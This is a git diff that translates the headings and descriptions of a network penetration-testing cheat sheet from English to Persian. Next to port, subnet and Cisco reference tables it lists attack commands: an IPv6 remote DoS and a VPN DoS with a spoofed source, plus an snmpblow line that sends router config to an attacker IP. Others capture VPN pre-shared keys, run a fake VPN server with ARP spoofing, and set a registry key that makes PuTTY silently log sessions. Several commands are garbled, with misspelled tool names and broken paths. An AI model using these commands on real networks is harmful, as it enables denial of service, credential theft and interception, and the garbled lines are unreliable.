@@ -1,12 +1,13 @@
 ---
 layout: default
+published: true
 ---
 
-# NETWORK
+# شبکه
 
-## Common ports
+## پورت های متداول
 
-| number | services |
+| شماره | سرویس |
 | :--- | :--- |
 | 21 | FTP |
 | 22 | SSH |
@@ -60,7 +61,7 @@ layout: default
 | 9090/1 | Open fire |
 | 9100 | Jet Direct |
 
-## TTL fingerprint
+## دریافت اطلاعات سیستم عامل با TTL
 
 | os | size |
 | :--- | :--- |
@@ -69,9 +70,9 @@ layout: default
 | Network | 255 |
 | Solaris | 255 |
 
-## IPV4
+## اطلاعات IPV4
 
-### Classful ip ranges
+### محدوده Classful
 
 | name | start | end |
 | :--- | :--- | :--- |
@@ -81,7 +82,7 @@ layout: default
 | D | 224.0.0.0 | 239.255.255.255 |
 | E | 240.0.0.0 | 255.255.255.255 |
 
-### Reversed ranges
+### محدوده Reversed
 
 | start | end |
 | :--- | :--- |
@@ -119,7 +120,7 @@ layout: default
 | /9 | 255.128.0.0 | 8388606 Host |
 | /8 | 255.0.0.0 | 16777214 Hosts |
 
-## Calculating subnet range
+## محاسبه محدوده subnet
 
 ```text
 Given: 1.1.1.101/28
@@ -131,9 +132,9 @@ Given: 1.1.1.101/28
 Range where given IP falls: 1.1.1.96 - 1.1.1.111
 ```
 
-## IPV6
+## اطلاعات IPV6
 
-### Broadcast addresses
+### آدرس های Broadcast
 
 ```text
 ff02::1 - link-local nodes
@@ -143,7 +144,7 @@ ff02::2 - link-local routers
 ff05::2 - site-local routers
 ```
 
-### Interface addresses
+### آدرس های Interface
 
 ```text
 fe80:: -link-local
@@ -152,51 +153,51 @@ fe80:: -link-local
 ::ffff:a.b.c.d- IPv4 mapped IPv6
 ```
 
-### THC ipv6 toolkit
+### جعبه ابزار ipv6
 
 ```text
 Remote Network DoS:
 rsumrf6 eth# remote ipv6
 ```
 
-### Socat tunnel ipv6 trough ipv4 tools
+### تونل ipv6 در ipv4  با socat
 
 ```text
 socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[2001::]:80
 ./nikto.pl -host 12-.0.0.1 -port 8080
 ```
 
-## Cisco commands
+## دستورات سیسکو
 
 <table>
   <thead>
     <tr>
-      <th style="text-align:left"><b>Command</b>
+      <th style="text-align:left"><b>دستور</b>
       </th>
-      <th style="text-align:left"><b>Description</b>
+      <th style="text-align:left"><b>توضیح</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">enable</td>
-      <td style="text-align:left">Enter privilege mode</td>
+      <td style="text-align:left">فعال سازی حالت privilege</td>
     </tr>
     <tr>
       <td style="text-align:left">#configure terminal</td>
-      <td style="text-align:left">Configure interface</td>
+      <td style="text-align:left">تنظیمات interface</td>
     </tr>
     <tr>
       <td style="text-align:left">(config)#interface fa0/0</td>
-      <td style="text-align:left">Configure FastEthernet 0/0</td>
+      <td style="text-align:left">تنظیم FastEthernet 0/0</td>
     </tr>
     <tr>
       <td style="text-align:left">(config-if)#ip addr 1.1.1.1 255.255.255.0</td>
-      <td style="text-align:left">Add IP to fa0/0</td>
+      <td style="text-align:left">تنظیم IP به fa0/0</td>
     </tr>
     <tr>
       <td style="text-align:left">(config)#line Vty 0 4</td>
-      <td style="text-align:left">Configure vty line</td>
+      <td style="text-align:left">تنظیم خط vty</td>
     </tr>
     <tr>
       <td style="text-align:left">(config-line)#login</td>
@@ -207,143 +208,145 @@ socat TCP-LISTEN:8080,reuseaddr,fork TCP6:[2001::]:80
     </tr>
     <tr>
       <td style="text-align:left">(config-line)#password password</td>
-      <td style="text-align:left">Set telnet password</td>
+      <td style="text-align:left">تنظیم کلمه عبور برای telnet</td>
     </tr>
     <tr>
       <td style="text-align:left">#show session</td>
-      <td style="text-align:left">Open sessions</td>
+      <td style="text-align:left">بازنمودن جلسه</td>
     </tr>
     <tr>
       <td style="text-align:left">#show version</td>
-      <td style="text-align:left">IOS version</td>
+      <td style="text-align:left">نسخه IOS</td>
     </tr>
     <tr>
       <td style="text-align:left">#dir file systems</td>
-      <td style="text-align:left">Available files</td>
+      <td style="text-align:left">فایل های موجود</td>
     </tr>
     <tr>
       <td style="text-align:left">#dir all-filesystems</td>
-      <td style="text-align:left">File information</td>
+      <td style="text-align:left">اطلاعات فایل</td>
     </tr>
     <tr>
       <td style="text-align:left">#dir /all</td>
-      <td style="text-align:left">Deleted files</td>
+      <td style="text-align:left">حذف فایل ها</td>
     </tr>
     <tr>
       <td style="text-align:left">#show running-config</td>
-      <td style="text-align:left">Config loaded in mem</td>
+      <td style="text-align:left">تنظیمات داخل memory</td>
     </tr>
     <tr>
       <td style="text-align:left">#show startup-config</td>
-      <td style="text-align:left">Config loaded at boot</td>
+      <td style="text-align:left">تنظیمات داخل boot</td>
     </tr>
     <tr>
       <td style="text-align:left">#show ip interface brief</td>
-      <td style="text-align:left">Interfaces</td>
+      <td style="text-align:left">لیست Interfaces</td>
     </tr>
     <tr>
       <td style="text-align:left">#show interface e0</td>
-      <td style="text-align:left">Detailed interface info</td>
+      <td style="text-align:left">جزییات اطلاعات interface</td>
     </tr>
     <tr>
       <td style="text-align:left">#show ip route</td>
-      <td style="text-align:left">Routes</td>
+      <td style="text-align:left">لیست Route ها</td>
     </tr>
     <tr>
       <td style="text-align:left">#show access-lists</td>
-      <td style="text-align:left">Access lists</td>
+      <td style="text-align:left">لیست های دسترسی</td>
     </tr>
     <tr>
       <td style="text-align:left">#terminal length 0</td>
-      <td style="text-align:left">No limit on output</td>
+      <td style="text-align:left">هیچ محدودی در خروجی نباشد</td>
     </tr>
     <tr>
       <td style="text-align:left">#copy running-config startup-config</td>
-      <td style="text-align:left">Replace run w/ start config</td>
+      <td style="text-align:left">جایگذاری تنظیمات از memory به boot</td>
     </tr>
     <tr>
       <td style="text-align:left">#copy running-config tftp</td>
-      <td style="text-align:left">Copy run config to TFTP Svr</td>
+      <td style="text-align:left">کپی از تنظمیات بر روی tftp</td>
     </tr>
   </tbody>
-</table>### Cisco IOS 11.2-12.2 vulnerability 
+</table>
+
+### آسیب پذیری های  IOS 11.2-12.2 
 
 ```text
 http:// ip /level/ 16-99 /exec/show/config
 ```
 
-## SNMP
+## پروتکل SNMP
 
-Must start TFTP server 1st
+نیاز به شروع سرویس tftp
 
 ```text
 ./snmpblow.pl -s srcip -d rtr_ip -t attackerip -f out.txt
 snmpstrings.txt
 ```
 
-### Windows running services
+### لیست سرویس های اجرایی ویندوز  
 
 ```text
 snrnpwalk -c public -v1 ip 1 | grep hrSWRJnName | cut -d" " -f4
 ```
 
-### Windows open TCP ports
+### پورت های باز ویندوز
 
 ```text
 smpwalk | grep tcpConnState | cut -d" " -f6 | sort -u
 ```
 
-### Windows installed software
+### نرم افزار های نصب شده
 
 ```text
 smpwalk | grep hrSWinstalledName
 ```
 
-### Windows users
+### کاربران ویندوز
 
 ```text
 snmpwalk ip 1.3 | grep 77.1.2.25 -f4
 ```
 
-## Packet capturing 
+## ضبط Packet 
 
-### Capture TCP traffic on port 22-23
+### ضبط بسته های پورت 22- 23
 
 ```text
 tcpdump -nvvX -sO -i eth0 tcp portrange 22-23
 ```
 
-### Capture traffic to specific ip excluding specific subnet
+### ضبط ترافیک ip خاص به غیر از subnet
 
 ```text
 tcpdump -I eth0 -tttt dst ip and not net 1.1.1.0/24
 ```
 
-### Capture traffic B/W local-192.1
+### ضبط ترافیک 192.1
 
 ```text
 tcpdump net 192.1.1
 ```
 
-### Capture traffic for &lt;SEC&gt; seconds
+### ضبط زمان بندی شده ترافیک 
 
 ```text
 dumpcap -I eth0 -a duration: sec -w file file.pcap
 ```
 
-### Reply PCAP
+### بررسی Reply PCAP
 
 ```text
 file2cable -i eth0 -f file.pcap
 ```
 
-### Reply packets \(FUZZ \| Dos\)
+### بررسی Reply packets \(FUZZ \| Dos\)
 
 ```text
 tcpreplay --topspeed --loop=O --intf=eth0 .pcap_file_to replay rnbps=10|100|1000
 ```
 
-### DNSRecon
+### دستور DNSRecon
 
 ```text
 Reverse lookup for IP range:
@@ -356,7 +359,7 @@ DNS zone transfer:
 ./dnsrecon -d domain.corn -t axfr
 ```
 
-### Nmap reverse dns lookup and output parser
+### عملیات reverse dns lookup و بررسی خروجی با nmap
 
 ```text
 nmap -R -sL -Pn -dns-servers dns svr ip range | awk '{if( ($1" "$2"
@@ -366,19 +369,19 @@ dns.txt
 
 ## VPN
 
-### Write psk to file
+### نوشتن psk بر روی فایل
 
 ```text
 ike-scan -M -A vpn ip -P file
 ```
 
-### Dos vpn server
+### حمله به سرور vpn
 
 ```text
 ike-scan -A -t 1 --sourceip= spoof ip dst ip
 ```
 
-### Fiked - fake vpn server
+### Fiked - ایجاد سرور vpn تقلبی
 
 ```text
 Must know the VPN group name a~d pre-shared key;
@@ -404,13 +407,12 @@ Must know the VPN group name a~d pre-shared key;
    ettercap -T -M arp II II
 ```
 
-## Putty
+## نرم افزار Putty
 
-### Reg key to have putty log everything \(including conversations\)
+### کلید رجیستری برای گزارش گیری از هر عملیاتی توسط putty \(حتی دستورات و خروجی ها\)
 
 ```text
 [HKEY_CURRENT_USER\Software\Si~onTatham\Putt;\Sessions\Default%20Settings]
 "LogFileName"="%TEMP%\putty.dat"
 "LogType"=dword:00000002"
 ```
-
